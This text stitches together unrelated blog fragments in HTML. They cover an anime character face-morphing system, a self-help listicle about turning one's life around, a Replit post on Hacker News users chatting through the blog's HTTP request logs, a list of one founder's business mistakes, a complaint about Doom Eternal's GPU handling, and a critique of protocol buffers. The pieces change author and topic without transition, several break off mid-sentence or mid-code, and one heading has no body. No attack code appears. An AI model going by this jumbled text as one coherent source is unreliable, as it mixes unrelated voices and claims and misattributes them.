			<li>a partial image change to retouch the output of the last step, and</li>
			<li>another partial image change to deform the eyelids.</li>
		</ol>

			<b>Figure 2.7</b> Architecture of the eye &amp; mouth morpher.
		</p>

		<p>The above rather complicated process was a result of my iterating on the architecture. The first warping step is required to preserve high-frequency details of the irises. If partial image change were used, iris patterns drawn by artists would be lost.</p>

		
		<p><b>Figure 2.8</b> The effect of the first warping step of the eye &amp; mouth morpher on the quality of the irises. The character is <a href="https://www.youtube.com/channel/UCzrw4K7D9Ti3FP8WMTVPImg">Weatheroid Airi</a> (© Weathernews Inc.).
		</p>
	
		

		<p>The last step is necessary to produce artifact-free closed eyelids. If I were to deform the eyelids together with other facial features, they would be covered by the first warping step. I discovered that this led to small lines near the eyes being smeared, and the eyelids would be blemished as a result.</p>

		
		<p><b>Figure 2.9</b> The effect of processing the eyelids with a partial image change in a separate step. Notice the blemish produced by the architecture with warping. It is the result of the network's dragging the eyelid down and thereby smearing the small line inside the ground truth's red box. My proposed architecture simply fills the space with a solid color, yielding an artifact-free image.

		<h2>3 &nbsp; Results</h2>

		<p>I applied my system to 200 images of VTubers and related characters to generate a short video clip for each, and I put all the videos together in the <a href="#eyecatcher">eyecatcher</a>. You can watch the individual videos in the figure below.</p>

		<p>Below is a selection of characters making the 7 facial expressions shown at the beginning of the article.</p>
	</div><div>

		<p>The above figure demonstrates the versatility of my system. It could handle both male and female characters with very different eye and face shapes. It sensibly deformed the eyes even when partially occluded by hair or seen through translucent glasses. It hallucinates plausible mouth shapes in cases where the input image has a closed mouth while my previous system would just leave the mouth as is.</p>

		<p>Another strengths of my system is its flexibility: I can combine it with any source of pose parameters. I thus use it to create a number of content creation tools and <a href="https://en.wikipedia.org/wiki/Vidding">fanvids</a>.</p>

		<p>First, I created a desktop application that allows the user to manipulate an anime character's facial expression and face rotation by dragging sliders. The resulting image can be saved for later use.</p>

		</p>

		<p>Second, I wrote a program that converts motions authored for 3D models into sequences to pose parameters, allowing me use them to drive 2D character illustrations. With this tool, I created 4 music videos.</p>

<p>Let’s take a look at my life just a few short years ago.</p>
<p>I had a 0.00 GPA the first semester of my senior year in college. You read that right, I got F’s in every single one of my classes. I didn’t bother going to class at all. Oh, did I mention I dropped out of school when I only needed three credits to graduate?</p>
<p>I drank 7 nights a week and tried every drug imaginable other than the big three — crack, heroin, and meth.</p>
<p>At one point in my life, I had little hope, felt like I was rapidly falling behind in life, and I didn’t really know what to do. I hit bottom.</p>
<p>But here I am now. Life is 1,000 percent different, 180-degree turn, all that good stuff.</p>
<p>Not that a life transformation can be summed up in a few simple prescriptions, but the general ideas of self-improvement can lead to specific changes that you can make in your life.</p>
<p>You can make them.</p>
<p>Let’s be honest, most people don’t. But you can. That’s all I can give you, but fortunately, that’s enough. If you want to <a href="https://medium.com/mind-cafe/how-to-solve-your-lack-of-motivation-problem-d38e02025628">change your life</a>, here are some places you can start.</p>
<h2>Be honest with yourself</h2>
<p>You’ll never be able to fix your life until you admit it’s broken. Don’t pretend everything is okay when it’s not. You need to take full responsibility for your life up to this point.</p>
<p>Admit that you’ve made poor decisions. Admit that you haven’t been working as hard as you should be. Understand that you g<a href="https://medium.com/mind-cafe/7-ways-you-sabotage-yourself-on-the-path-to-reaching-your-goals-1314ffb55c8e">et a mental payoff from lying to yourself.</a></p>
<p>Most people would rather die in a pool of their own rationalizations than change, which is understandable. Honest self-reflection doesn’t feel good. It’s brutal. It hurts. We don’t really want that feedback from the world that shows us who we really are. We don’t want it, but we need it. You need it.</p>
<p>Stop bullshitting yourself.</p>
<h2>Get Fed Up</h2>
<p>One critical point in my life that I’ve written about ad absurdum at this point. I literally had an isolated moment where I decided to change my life. I stood up in my crappy apartment and screamed at the top of my lungs, “I’m not fucking living like this anymore!”</p>
<p>I’d always been an optimist. An idealist. If you’re one of these people, you’ll get tired of the world-beating you up. Or rather, you<em> allowing the world</em> to beat you up. The incongruency between the way you know your life should be vs the way it is will hit you. This doesn’t mean you’ll ride the wave of motivation that comes from it long enough to change, but it’s your best shot.</p>
<p>You get these handfuls of moments where you feel that <a href="https://medium.com/mind-cafe/how-to-permanently-stay-motivated-d24023454870">raw motivational energy</a>. Seizing these moments will make or break your future.&nbsp;Strong negative emotions can be just as powerful as positive ones. When will “enough be enough,” for you? When will you decide you can’t live this way for even one more day? Once you make that decision, everything changes.</p>
<h2><strong>Ask&nbsp; Smart Questions<br>
</strong></h2>
<p>Dumb people make the mistake of thinking they have everything figured out. The more certain you are about reality, the poorer your reality is. This is almost always true.</p>
<p>If your life isn’t where you want it to be, it should be evident that you don’t have access to the right information. Search for it. Ask questions. Ask yourself, “Why is my life the way it is?” Think about that. Have you ever actually questioned why you’re in this position? Or do you just meander aimlessly through life in some sort of unactualized haze? Probably the latter.</p>
<p>Great questions lead to great answers. Ask questions about the way your life is now and what <a href="https://www.youtube.com/watch?v=6JS2RMoRMtY&amp;t=1s">needs to be done to make it better</a>. The answers you come up with will guide you to a better future. Ask other people about what they think you’re good at. Ask people who are living the type of life you want to live how they got where they are. A great life isn’t just going to fall into your lap. You need to seek it out. Ask and you shall receive.</p>
<h2>Read Books</h2>
<p>Unfortunately, as a self-help writer, I’m contractually obligated to write about books in at least 50 percent of all my blog posts. Look, who knows the true magic behind reading? I don’t. But it’s just….magic. What can I say?</p>
<p>Now, reading books doesn’t change your life in and of itself, but it opens the doorway to that change in your life.&nbsp; One great book can change your entire life. Books can inspire you,<a href="http://ayotheauthor.com/best-self-help-books/">&nbsp;expand your mind,</a> and&nbsp;open your eyes to what’s possible.&nbsp;Great books often contain years or decades of knowledge from the author.</p>
<p>If there’s a certain path you’re seeking, there’s a book by someone who’s done it already. Read their stories, learn from their mistakes, and steal their knowledge.</p>
<p>Maybe it’s this — reading more books helps you understand that people have already figured everything out. You’re not unique. You don’t have some situation that someone hasn’t already gone through.</p>
<h2>Find Something You’re Good At (and Become Great At It)</h2>
<p>A friend of mine suggested I started writing articles for his website, so I did. I fell in love with it. I’d always wanted to write, but I didn’t listen to my inner voice and kept putting it off.</p>
<p>When you find something you’re good at and you work to become great at it, you’ll feel passionate about it. Human beings are wired for growth and accomplishment.</p>
<p>You don’t need to travel the world and become an adventurer. You don’t need to make millions. And you definitely don’t need to become famous.</p>
<p>You do need to master a skill and master yourself in the process of developing that skill. I’m convinced this is the key. <a href="https://medium.com/mind-cafe/the-5-year-rule-how-to-create-the-future-you-want-e25e00770612">Competence is the key</a>. Not passion, not pleasure, not hedonism. The fruits of hard and purposeful work.</p>
<p>This is what you want.</p>
<p><iframe src="https://www.youtube.com/embed/n--shTwdx_0" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>

<h2>Find Heroes</h2>
<p>Remember the point I just made about books? The fact that someone else has already walked your path? I have a rule that has served me well every time I followed it.</p>
<p>Follow smart people. Reverse engineer their success. Ignore most people and focus on behaving like the few who actually live the way you want to live. Most of the world is filled with noise. Finding the right person to emulate can be a signal amongst that noise.</p>
<p>It’s not that you’ll get the same results as the people you follow. It’s that you’ll swipe the mental models that made them successful and you’ll use them to <a href="https://medium.com/@Chef_BoyarDEJI/5-quotes-to-live-by-if-you-want-to-live-an-uncommon-life-b9962fa2713">create your own version of success.</a></p>
<p>Find somebody you want to be like and learn everything about them — their story, what they did to become successful, their high and low points. The low points are important. You have to understand the price you’ll have to pay to get what you want. Nothing is free.</p>
<p>Having someone to look up to keeps you inspired. Their stories will empower you because they’re normal people just like you. Seeing where someone started and what they did to accomplish great things will motivate you to do the same.</p>
<h2>Know Yourself</h2>
<p>You think you are “yourself.” You’re not.</p>
<p>You’re not your real self. The real you is buried underneath a fifteen thousand-mile deep pile of rationalizations, societal scripts,&nbsp; misinformed beliefs, and other BS you’ve convinced yourself is necessary to maintain your identity.</p>
<p>After you remove all of this nonsense, you’ll find you. Self-awareness is crucial to living a good life, but it’s impossible to develop a perfect level of it. Try anyway. Get as close as you possibly can.</p>
<p>Think about what<a href="https://medium.com/the-post-grad-survival-guide/how-to-follow-your-dreams-without-putting-too-much-pressure-on-yourself-or-feeling-guilty-4ea5980bd00e"> <em>you</em> want to do with your life </a>— not what your parents, friends, or society wants you to do. Study yourself. Find out what you’re good at and continue to develop your strengths. When life isn’t going your way, you’re the problem. <a href="https://www.youtube.com/watch?v=9Zf9Q4EIvXk&amp;t=156s">You’re also the solution</a>. When you know who you are, want you want, and where you’re going, nobody can stop you.</p>
<h2>Think</h2>
<p>You don’t know how to think. You think you do, but you don’t. Instead of actually thinking, you just run loops of mental chatter — chatter based on all the things I mentioned in the previous point. Your life moves in the direction of this chatter and then you get the results you get.</p>
<p>You become what you “think” about most.</p>
<p>Developing the skill of thinking means you have to find ways to replace your loops with real thoughts, lucid thoughts, useful thoughts.</p>
<p>Sitting alone in a room and genuinely thinking is a great start. Journaling helps. Taking steps to change your life and analyzing how well those steps worked is another one.</p>
<p>The more you learn to truly think, the less you trust those mental chatter type of thoughts. Self-improvement is the process of changing the ratio between useful and harmful thoughts. That’s it.</p>
<p>The moral of the story? It’s all in your mind. Change your mind and you change reality.</p>
<h2>Take Some Form of Action</h2>
<p>Of course, you can’t just think your way to success, you have to, you know, do something</p>
<p><strong>Do something</strong>.</p>
<p><strong>Something.</strong></p>
<p><strong>Anything.</strong></p>
<p>I always give the same caveat. I can’t <em>make you do anything</em>. No one can. At some point, you’re going to have to do the cliche thing and…buck up. Here’s as close as I can get you. You just have to find a way to get all riled up in your mind. Just tell yourself “screw it. I’m doing this” Pump up your emotional state and get it high enough to pull the trigger.</p>
<p>That’s what brainwashing yourself with self-improvement helps you do. It pumps up your state. That’s all it does, actually, but it’s enough to get you inches in front of the door. You still have to open it, though.</p>
<p>Once you become a doer, though, your momentum will carry you through life. You won’t have to “get motivated” anymore. You’ll be motivated by default.</p>
<p>Of course, you’ll never get there until you start. So start.</p>

<h2>Realize the Universe Doesn’t Care About You</h2>

		<p>Yesterday, I accidentally built a chat app. Surprisingly, it wasn't the first time it happened.</p>
<p><img src="https://blog.repl.it/images/chat/colors.jpeg" alt="colored chat screenshot"></p>
<p>Before I tell you how Hackernews turned (this blog's) <a href="https://blog.repl.it/__logs">HTTP logs</a> into chat, let me tell you about how a 12-year old user hacked the first chat app and community space on Replit right into a Python REPL.</p>
<p>In 2018 we didn't know we had such a strong community of tinkerers. We knew people make games with Replit and share it with other people. But we didn't realize we'd already been a Schelling point for young hackers. </p>
<p>One day, <a href="https://repl.it/@pyelias">@pyelias</a> created a post on our support forum saying he built a Chatroom and linked to a repl. I thought it would be a simple chatbot or something similar because I hadn't seen internet-based apps on the platform until that point. We had just opened up <a href="https://blog.repl.it/internet-access">internet access</a> to everyone, but we didn't support web hosting or any advanced features Replit has today. It was a very constrained environment.</p>
<p>When I opened up Pyelias' Chatroom, I saw a vibrant community. It was mindblowing. It was like suddenly discovering the chair you'd been sitting on was made of gold. The community was not only fun, but it was also helpful, wholesome, and inviting.</p>
<p><img src="https://blog.repl.it/images/chat/chatroom.png" alt="chatroom screenshot"></p>
<p>The way the Chatroom worked: the repl acted as a terminal client. When you run the code, it connected to a remote database and pulled for the latest messages. The entire application logic was on the client. Over the next few days, I saw rapid iteration. It went from a simple Chatroom to something like IRC. It had rooms, private messages, colors, muting, and because it's on top of the Python repl, it also had support for inline code evaluation. </p>
<p>As the room grew, it naturally had problems with spam and bad actors. So it grew moderation features, filters, etc. Other users started contributing ideas and ways to improve it. It was magnificent and a model for making Replit a magical place for serendipitous computer explorations. </p>
<p>From there, we grew our community features, and today we have a fantastic <a href="https://repl.it/talk">forum</a> where people share apps and find other people to work with. In a future post, I'll tell how they built a fully programmable "Stonk" market. </p>
<h2 id="hackernews-chats-in-http-logs">Hackernews chats in http logs</h2>
<p>In our blog's <a href="https://repl.it/@util/replit-blog#posts/internet-of-fun.md">repl</a> (where the app is hosted), I was writing something when I saw the HTTP logs in the console accelerate. For some reason, I knew it was hackernews, so I went there and saw <a href="https://news.ycombinator.com/item?id=25991988">the post</a> on the front page. I commented on it, saying that people can see the log stream by going to <a href="https://blog.repl.it/__logs">https://blog.repl.it/__logs</a></p>
<p><a href="https://news.ycombinator.com/item?id=25993765">andrewxhonson on Hackernews</a> visited the logs and saw an opportunity to chat. Because the blog was logging all the GET requests, you can effectively send "messages" to the logs by going to a path on the website (even if it doesn't exist). So for example, <code>https://blog.repl.it/hi%20my%20name%20is%20fred</code> resulted in a <code>GET hello my name is fred</code> log message. Now you have a streaming website that anyone can drop messages into -- i.e., a chat room!</p>
<blockquote><p lang="en" dir="ltr">Hackernews found our blog logs and are new chatting in the HTTP requests. <a href="https://t.co/jYgwmMJRDP">https://t.co/jYgwmMJRDP</a> <a href="https://t.co/OkujyM8s3N">pic.twitter.com/OkujyM8s3N</a></p>— Amjad Masad (@amasad) <a href="https://twitter.com/amasad/status/1356344510465286144?ref_src=twsrc%5Etfw">February 1, 2021</a></blockquote> 

<p>I tweeted about it, and someone posted it on HN as a separate post, so it started growing. At first, people couldn't tell that Replit logs is a terminal complete with support for ANSI escape codes. I dropped that hint on HN comment, and they were off to the races. </p>
<p><img src="https://blog.repl.it/images/chat/colors.jpeg" alt="colored chat screenshot"></p>
<p>However, if you don't send an <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI reset</a> after your message, you're styling all the subsequent messages in the stream. I fixed that by adding a reset before each log message. I was coding live, so when I restarted the app, it broke and logged the syntax error to the console, which is actually the chatroom, and my users saw it. Not only do I have users on my accidental chatroom, they're also watching me work live and seeing my embarrassingly sloppy code (incidentally, that's why I love repl-driven coding you see the mistakes you make live and fix them quickly).</p>
<p><img src="https://blog.repl.it/images/chat/chat_style.png" alt="colored chat screenshot"></p>
<p>Yesterday, I had many meetings (I don't code full-time anymore, sadly) so I had to fix the Chatroom (I mean blog logs lol) incrementally between calls. Naturally, with growth came the bad actors. Someone started posting 10s of thousands of messages and spamming the chat. My first reaction was: "wow it's amazing how resilient this webserver hosted on a single container!" Then I thought about implementing rate-limiting and profanity filters. However, I had a meeting in the next 5 minutes. Instead, I put Cloudflare in front of the blog, and with a couple of firewall rules, the blocking started! </p>
<p><img src="https://blog.repl.it/images/chat/blocking.png" alt="colored chat screenshot"></p>
<p>Finally, before the day was over, I noticed that a <a href="https://repl.it/@ConnorBrewster/blog-chat">handful</a> of <a href="http://repl.chat/">clients</a> for the chat has emerged, and things thing has a life of their own. </p>
<p><img src="https://blog.repl.it/images/chat/client.png" alt="cloudflare rate limiting"></p>
<p>Even as I'm writing this post in the repl, I can see the chat continue. There are now JSON messages and some weird protocol that's going on. Are people building apps on it? I'm sure that will happen before the end of the week. After all, it's a full terminal, and you can make entire UIs on it. </p>
<p><img src="https://blog.repl.it/images/chat/more.jpeg" alt="json messages"></p>
<p>I'm writing this story because we want to show the world that computers &amp; the internet are still fun. Hacking, tinkering, and weird experiments continue to happen on platforms like Replit. Because every repl on Replit is a full computer that comes with access to the network, a database, storage, and access to its code, user profiles, and other primitives, it makes it inherently amenable to serendipity and accidental software interactions. </p>
<p>I invite everyone to <a href="https://repl.it/">sign up</a> and check out our <a href="https://repl.it/talk">community</a> and see what fun, weird things people are <a href="https://repl.it/talk/share">building</a>. Even if you're not interested in Replit the "online IDE" you might find that Replit, the "weird internet computer" will make you giddy programming (again).</p>

<p><strong>1. Close your business while it’s working</strong></p>

<p>I opened my first business right out of high school. I had a few thousand dollars saved up and I wanted to start a business. I found a tiny office space on a busy road and shook hands with the landlord. My Dad helped me make a sign using a piece of wood and a vinyl sticker. I purchased two computer systems and set them up on folding tables. I purchased a desk and a chair and put those in the back of my space, like a small used car salesman. Suddenly, I was selling custom built computer systems using off the shelf parts.</p>

<p>A few months later I got a call from my high school. I told the caller what I was up to and he informed me that the school would receive a small grant because I was working in the industry I had aspired to less than a year after graduation.</p>

<p>Then, I fell in love. No, that’s not right, I was in love before I had even started this. But, the conversation had turned to marriage and children. The business was working okay, but I didn’t think I was doing well enough to support a family. I needed a real job making real money. After working in the store for just nine months, I applied at a local tech company and walked away from my little business.</p>

<p>Three months later I would hire an accountant to do my taxes. I handed him a shoe box full of receipts and invoices and let him figure it out. When he handed me my first <em>Schedule C</em> I nearly hit the floor. I was showing a business loss that was more money than I had ever imagined. He explained that I would be able to write this loss off, in parts, over the next seven years.</p>

<p>But, remember, I had come into this business with only a few thousand dollars. If I had <em>lost</em> that kind of money, I had also <em>made</em> that money to lose. If I were paying attention, I think the business would have been profitable. But, I wasn’t paying attention, and the business had closed months ago.</p>

<p><strong>2. Get a cease and desist from your own employer</strong></p>

<p>Remember that Tech job I landed to make real money? Turns out, that was a good move. The company I joined was Iomega and they were roaring. They had recently released the Zip drive and had gone from 100k in annual revenue to a two billion dollar company. With that kind of growth, money and promotions were all around me. I loved the job and the people I was working with. I was climbing the corporate ladder and loving it.</p>

<p>Iomega also made the higher end Jaz drive, and all of us had one (or two) on our desks. Some of my co-workers were complaining about a problem though. The Jaz drive would spin-down, after two minutes or so, to conserve energy. The next time you accessed the drive, it took 20 or 30 seconds for it to spin up.</p>

<p>I had access to an internal engineering manual for the drive, so I dived in. I concluded that the drives were designed to spin down mostly to save energy. Based on the numbers I had, I figured they would last more than 10 years, even if they were running 24/7. But, there was no way to configure them to stay spinning. The sleep was built into the firmware of the drive itself.</p>

<p>That’s when I got the idea for my first Shareware program. It was a simple Windows utility that I called JazAwake. It would write a tiny file to the Jaz drive every 60 seconds and then delete it. The file was just big enough that it would flush it to disk. Because the drive was being written too every minute or so, it would no longer spin down.</p>

<p>The program was popular both inside the company and out. All of my co-workers were using it and people were starting to pay to register it.</p>

<p>Then I got a letter from one of the lawyers at Iomega. It was addressed to my software company. It was a cease and desist asking me to stop using the Jaz trademark and remove JazAwake from the Internet. At first, I laughed. How can you remove a piece of software from the Internet? That’s impossible. But, nothing short of that would stop them from suing me.</p>

<p>Luckily, they didn’t realize I also worked there, or I imagine I would have lost my job too.</p>

<p>I went to work creating my own cease and desist letter explaining what I had done and started mailing them to every organization that had written about or linked to my software. I had to send these letters to over a hundred different companies. I went back and forth with the lawyers at Iomega for about 6 months and when they could no longer find the software online, they were satisfied.</p>

<p>I stayed at Iomega for a couple more years and I created another popular Shareware program called ButtonWiz. When Iomega started to lose steam, I left for a smaller company.</p>

<p><strong>3. Close your side business and focus on the promise of becoming CEO</strong></p>

<p>I got a job at a small technology company that served only about 100 customers. But, the owner had created something useful and he was making enough money to pay for himself and another employee. He didn’t want to make too much profit, because that meant paying more taxes and quarterly tax paperwork. He would watch the books so that his profit was less than $4k per year. If we had made too much money for the year, by October or November, he would spend some of it on new things we needed for the office or employee bonuses. It worked out really well.</p>

<p>The owner was getting up there in age and he figured he would like to retire in another 10 years or so. None of his family was interested in the business he had built and he had no real plan to exit. So, he had the idea that he would hand the business to me at some point and I would continue to pay him well into retirement. He purchased a life insurance policy and set me as the beneficiary. If he died before he was able to retire, I could pay his family and continue to run the business.</p>

<p>ButtonWiz continued to get more and more popular and was now bringing in a few hundred dollars a month. One day the boss suggested that I stop working on my side projects and double-down at the office. So, I shelved work on ButtonWiz and let it wither away over the next few years while I focused on the company I worked for.</p>

<p>Now eight years into my Career here, the company had grown from the two of us to around ten employees. Among those employees a few family members had been introduced, but I was still employee number two. Then the boss dropped a bomb that didn’t completely surprise me. There were people in the family showing interest now and he had decided to keep the business in the family. I can’t blame him. One of the reasons I’ve always wanted to build a business is to support my family and, if it’s really successful, more of those around me. But, suddenly, my career felt like another job, so I started to look elsewhere.</p>

<p><strong>4. Break Googles TOS and accidentally commit click fraud while your at it</strong></p>

<p>Growing more and more frustrated with the stress of my job, I started to run. I would run at a park by my office every day on my lunch break. I also started watching my weight and I started writing software again.</p>

<p>I had tried a bunch of calorie trackers but logging all the specific foods I ate was too much for me. I decided to create a calorie tracker that was fast. I would just enter the number of calories I ate and the web app would timestamp them. No more looking up foods.</p>

<p>At the top of the app I created a search box and I pointed that to a webview that opened to Google. I modified the search a little by adding the word “calories” to the end of it. That way, I could search for something like “pizza” and it would return a set of results for “pizza calories”, often with the actual number of calories right there at the top. I also signed up for Google advertising and embedded a mobile ad unit on the page. I released it for the iPhone and published it free on the web app directory on Apple.com (the App Store didn’t exist yet).</p>

<p>The money started rolling in. Lots of users were downloading the app and using it and the ad revenue was crazy high. It made a ton of money for a couple weeks and then I started looking at my ad click rates. They were astronomical. In fact, my click through rate was so high, it had to be an error. I started digging in.</p>

<p>What I found is that the search box and the ad unit were in close proximity to each other and users were accidentally clicking on the ad when they were trying to enter calorie counts. Oops.</p>

<p>I adjusted the placement of the two UI elements to be far apart. While I was doing that, I found a piece of information in Google’s Terms of Service that said you weren’t allowed to alter the search term a user entered. I was relying on Google for all my income here, so I also updated my search box so that it didn’t add the word “calories”, even though it made the search results significantly less relevant. Hopefully users would learn to do that themselves.</p>

<p>When I released the new version, as you might expect, the ad revenue tanked. Nearly all of the advertising clicks were users clicking by mistake.</p>

<p><strong>5. Write a book about a platform that changes a lot</strong></p>

<p>Since I was writing software again, I decided to give Facebook Apps a try. The app setup process was complex and confusing so I started to take detailed notes. After creating a “Hello World” app, I followed my instructions again and repeated the process for something more interesting. I refined my notes as I went, creating several test apps along the way. When I got done, I realized I had enough information to teach other developers how to do this. At the time, the Facebook documentation was sparse and hard to find. I had learned most of it by trial and error. I was also interested in trying self publishing. So, I decided I would spend the next weekend formatting this into a small book and self-publishing it on Amazon.</p>

<p>The book was selling a few copies a week and was getting great reviews.</p>

<p>About three months later, the book suddenly started to get bad reviews. I opened the book and followed it myself. Facebook had updated the process and things were different now. I made new notes and figured out the new process and …</p></div></div>

    <blockquote>
<p>&nbsp;&nbsp;&nbsp;&nbsp; “There’s that sort of sense that many technical people will see or feel when you see something and you know what it could be, and you know it could be important, and you see companies just doing it wrong — there’s that powerful desire to fix it and do it right and show them sort of how it’s supposed to be done”</p>
</blockquote>

<p>— <a href="https://www.youtube.com/watch?v=-dIUBGf1RHU&amp;t=9m17s">John Carmack at GDC 2015</a>, in what’s likely to be the most reused quote on this blog.</p>

<p>I just bought Doom Eternal. Excited to see the download has completed I fired it up and.. nothing. Just a bunch of resolution changes, then nothing - not even an error message. I’m back to the desktop right where I started. My first go-to was the <a href="https://steamcommunity.com/games/782330/announcements/detail/1806446683757378310">Doom Eternal support article on Steam</a>, where I was greeted with this gem:</p>

<blockquote>
<p>“Issue: DOOM Eternal fails to launch or crashes while launching on my Laptop.
Resolution: We do not officially support laptop hardware. Laptops that conform to the supported hardware specifications may run DOOM Eternal. Make sure the laptop uses its dedicated GPU and that the laptop is plugged into power. (This may also help with some desktops that use motherboards that have integrated GPUs.)
For NVIDIA users, your NVIDIA driver needs to be setup to pick the dedicated GPU.”</p>
</blockquote>

<p>I did happen to be using a laptop — a Razer Blade advanced model with a GeForce RTX 2080. It’s not like it’s an alien computer from outer space, and software shouldn’t have trouble running on a laptop versus a desktop. Let’s try to read between the lines and see how iD Software might be failing here. First there’s “Make sure the laptop uses its dedicated GPU” — most users aren’t technically inclined enough to know <em>how</em> to make sure the laptop does that, and in Doom Eternal’s case being powered by a Vulkan renderer means that at one point they need to be calling <a href="https://www.khronos.org/registry/vulkan/specs/1.2-extensions/man/html/vkEnumeratePhysicalDevices.html">vkEnumeratePhysicalDevices</a> to, ahem, enumerate the physical GPU devices on the system. Almost all hybrid systems will be using an Intel integrated GPU plus an NVIDIA or AMD discrete GPU — is this too hard to detect? Is a heuristic picking the non-Intel GPU when faced with two GPUs too much work? Such a heuristic would save Bethesda the effort of writing the above support message and quite a few support calls, and I’m not even going to touch upon lost sales. Direct3D users have <a href="https://docs.microsoft.com/en-us/windows/win32/api/dxgi/nf-dxgi-idxgifactory-enumadapters">IDXGIFactory::EnumAdapters</a>, which does the same thing. There’s really no excuse for requiring that the user, every user, jump through hoops when GPU selection is something that can be done in a few lines of code on the application’s side.</p>

<p>As for the second part, “Make sure… that the laptop is plugged into power” — can’t someone just call <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getsystempowerstatus">GetSystemPowerStatus</a> and display a warning? There’s no reason an app shouldn’t work on battery power (that’s pure madness if you ask me), but it’s reasonable to show a warning saying you’ll either drain your battery really fast or you’ll suffer decreased performance.</p>

<p>Later down in the same support document I came across another embarrassing answer:</p>

<blockquote>
<p>“Issue: Game crashes on launch with two AMD GPUs installed.
Resolution: Issue is caused by having multiple monitors plugged into different GPUs. Plug both monitors into the primary GPU to fix.”</p>
</blockquote>

<p>Seriously? There’s <a href="https://docs.microsoft.com/en-us/windows/win32/api/dxgi/nf-dxgi-idxgiadapter-enumoutputs">IDXGIAdapter::EnumOutputs</a>, and you can use the <a href="https://www.khronos.org/registry/vulkan/specs/1.0-wsi_extensions/html/vkspec.html#VkPhysicalDeviceProperties2KHR">VK_KHR_get_physical_device_properties2</a> extension to map a Vulkan device’s LUID to a DXGI device’s LUID.</p>

<p>It seems like Doom Eternal’s code, as technically impressive as its core renderer is, seems to only work fine on the authors’ computers and nothing significantly different — if you even hook up your monitors differently you’re shit out of luck. There isn’t even any effort to detect the known-bad cases and show an error message, you just get a blank screen then back to the desktop and then have to go through the support document and figure out what might apply to your case. Even if you ignore the time saved for customers, the dollar-amount cost for Bethesda in terms of support effort makes detecting such situations financially worth it.</p>

<p>Fabian Giesen once wrote a <a href="https://fgiesen.wordpress.com/2016/02/05/smart/">blog post</a> discussing the difference between intelligence and a high level of technical skill. There’s no doubt that the core tech in Doom Eternal is showcasing a level of technical skill unmatched by almost everyone else in the game development circles — but the end product, the thing that you can not inspect quality into as Harold F. Dodge once said, doesn’t seem like the work of someone very intelligent.</p>

<p>One of the biggest threats to a high quality end-product is highly skilled unintelligent people in a driver’s seat.</p>

    <p>I’ve spent a good deal of my professional life arguing against using protobuffers. They’re clearly written by amateurs, unbelievably ad-hoc, mired in gotchas, tricky to compile, and solve a problem that nobody but Google really has. If these problems of protobuffers remained quarantined in serialization abstractions, my complaints would end there. But unfortunately, the bad design of protobuffers is so persuasive that these problems manage to leak their way into your code as well.</p>
<h2 id="ad-hoc-and-built-by-amateurs">Ad-Hoc and Built By Amateurs</h2>
<p>Stop. Put away your email client that is half-way through writing me about how “Google is filled with the world’s best engineers,” and that “anything they build is, by definition, not built by amateurs.” I don’t want to hear it.</p>
<p>Let’s just get this out of the way. Full disclosure: I used to work at Google. It was the first (but unfortunately, not the last) place I ever used protobuffers. All of the problems I want to talk about today exist inside of Google’s codebase; it’s not just a matter of “using protobuffers wrong” or some such nonsense like that.</p>
<p>By far, the biggest problem with protobuffers is their terrible type-system. Fans of Java should feel right at home with protobuffers, but unfortunately, literally nobody considers Java to have a well-designed type-system. The dynamic typing guys complain about it being too stifling, while the static typing guys like me complain about it being too stifling without giving you any of the things you actually want in a type-system. Lose lose.</p>
<p>The ad-hoc-ness and the built-by-amateurs-itude go hand-in-hand. So much of the protobuffer spec feels bolted on as an afterthought that it clearly <em>was</em> bolted on as an afterthought. Many of its restrictions will make you stop, scratch your head and ask “wat?” But these are just symptoms of the deeper answer, which is this:</p>
<p>Protobuffers were obviously built by amateurs because they offer <em>bad solutions to widely-known and already-solved problems.</em></p>
<h3 id="no-compositionality">No Compositionality</h3>
<p>Protobuffers offer several “features”, but none of them see to work with one another. For example, look at the list of orthogonal-yet-constrained typing features that I found by skimming the <a href="https://developers.google.com/protocol-buffers/docs/proto3">documentation</a>.</p>
<ul>
<li><code>oneof</code> fields can’t be <code>repeated</code>.</li>
<li><code>map&lt;k,v&gt;</code> fields have dedicated syntax for their keys and values, but this isn’t used for any other types.</li>
<li>Despite <code>map</code> fields being able to be parameterized, no user-defined types can be. This means you’ll be stuck hand-rolling your own specializations of common data structures.</li>
<li><code>map</code> fields cannot be <code>repeated</code>.</li>
<li><code>map</code> keys <em>can</em> be <code>string</code>s, but <em>can not</em> be <code>bytes</code>. They also can’t be <code>enum</code>s, even though <code>enum</code>s are considered to be equivalent to integers everywhere else in the protobuffer spec.</li>
<li><code>map</code> values cannot be other <code>map</code>s.</li>
</ul>
<p>This insane list of restrictions is the result of unprincipled design choices and bolting on features after the fact. For example, <code>oneof</code> fields can’t be <code>repeated</code> because rather than resulting in a coproduct type, instead the code generator will give you a product of mutually-exclusive optional fields. Such a transformation is only valid for a singular field (and, as we’ll see later, not even then.)</p>
<p>The restriction behind <code>map</code> fields being unable to be <code>repeated</code> is related, but shows off a different limitation of the type-system. Behind the scenes, a <code>map&lt;k,v&gt;</code> is desugared into something spiritually similar to <code>repeated Pair&lt;k,v&gt;</code>. And because <code>repeated</code> is a magical language keyword rather than a type in its own right, it doesn’t compose with itself.</p>
<p>Your guess is as good as mine for why an <code>enum</code> can’t be used as a <code>map</code> key.</p>
<p>What’s so frustrating about all of this is a little understanding of how modern type-systems work would be enough to <em>drastically simplify</em> the protobuffer spec and simultaneously <em>remove all of the arbitrary restrictions.</em></p>
<p>The solution is as follows:</p>
<ul>
<li>Make all fields in a message <code>required</code>. This makes messages <em>product types</em>.</li>
<li>Promote <code>oneof</code> fields to instead be standalone data types. These are <em>coproduct types</em>.</li>
<li>Give the ability to parameterize product and coproduct types by other types.</li>
</ul>
<p>That’s it! These three features are all you need in order to define any possible piece of data. With these simpler pieces, we can re-implement the rest of the protobuffer spec in terms of them.</p>
<p>For example, we can rebuild <code>optional</code> fields:</p>
<div id="cb1"><pre><code><span id="cb1-1">product Unit {</span>
<span id="cb1-2">  <span>// no fields</span></span>
<span id="cb1-3">}</span>
<span id="cb1-4"></span>
<span id="cb1-5">coproduct Optional&lt;t&gt; {</span>
<span id="cb1-6">  t    value = <span>0</span>;</span>
<span id="cb1-7">  Unit unset = <span>1</span>;</span>
<span id="cb1-8">}</span></code></pre></div>
<p>Building <code>repeated</code> fields is simple too:</p>
<div id="cb2"><pre><code><span id="cb2-1">coproduct List&lt;t&gt; {</span>
